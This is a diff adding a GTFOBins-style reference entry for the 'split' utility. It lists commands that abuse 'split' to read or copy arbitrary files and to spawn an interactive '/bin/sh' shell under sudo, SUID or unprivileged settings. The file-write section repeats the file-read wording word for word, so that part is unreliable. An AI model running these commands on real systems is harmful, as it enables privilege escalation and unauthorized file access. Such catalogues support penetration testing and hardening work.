@@ -1,0 +1,47 @@
+split
+=====
+
+File read
+---------
+
+[Sudo]
+    split -b 999 --additional-suffix suffix /path/to/input-file prefix
+cat prefixaasuffix
+    This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
+
+[SUID]
+    split -b 999 --additional-suffix suffix /path/to/input-file prefix
+cat prefixaasuffix
+    This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
+
+[Unprivileged]
+    split -b 999 --additional-suffix suffix /path/to/input-file prefix
+cat prefixaasuffix
+    This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
+
+File write
+----------
+
+[Sudo]
+    split -b 999 --additional-suffix suffix /path/to/input-file prefix
+    This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
+
+[SUID]
+    split -b 999 --additional-suffix suffix /path/to/input-file prefix
+    This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
+
+[Unprivileged]
+    split -b 999 --additional-suffix suffix /path/to/input-file prefix
+    This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
+
+Shell
+-----
+
+[Sudo]
+    split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
+
+[SUID]
+    split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
+
+[Unprivileged]
+    split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
